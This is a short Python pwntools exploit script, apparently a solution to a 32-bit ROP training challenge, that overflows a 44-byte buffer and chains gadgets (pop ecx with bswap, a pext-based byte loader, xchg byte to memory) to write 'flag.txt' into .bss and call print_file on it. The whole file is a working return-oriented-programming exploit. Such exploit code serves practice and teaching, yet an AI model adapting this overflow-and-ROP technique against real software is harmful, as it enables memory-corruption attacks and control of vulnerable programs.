from pwn import *
from math import log

bss = 0x0804a020
print_file = 0x080483d0

def load_ecx(value):
    # 0x08048558: pop ecx; bswap ecx; ret;
    return p32(0x08048558) + p32(value, endian='big')


def load_dl(value):
    # 0x080485bb: pop ebp; ret;
    # 0x08048543: mov eax,ebp; mov ebx,0xb0bababa; pext edx,ebx,eax; mov eax,0xdeadbeef; ret;
    ebp = 0x0
    last = -1
    for c in bin(value)[2:][::-1]:
        #print(f"{c=}")
        if c == '0':
            search = 0
        else:
            search = 1
        for i in range(last+1,int(log(0xb0bababa,2))):
            if ((0xb0bababa & (1<<i))>>i) == search:
                ebp |= (1<<i)
                last = i
                break
        #print(bin(ebp))
    #print(f"{bin(0xb0bababa):>100}")
    #print(f"{bin(ebp):>100}")
    return p32(0x080485bb) + p32(ebp) + p32(0x08048543)

def write_dl_to_ecx():
    # 0x08048555: xchg byte ptr [ecx], dl; ret;
    return p32(0x08048555)

def write_bstr_to_adr(bstr,adr):
    ans = b''
    for i,c in enumerate(bstr):
        ans += load_ecx(adr+i) + load_dl(c) + write_dl_to_ecx()
    return ans

payload = cyclic(44)
payload += write_bstr_to_adr(b'flag.txt', bss)
payload += p32(print_file) + b'AAAA' + p32(bss)
with open("payload", 'wb') as f: f.write(payload)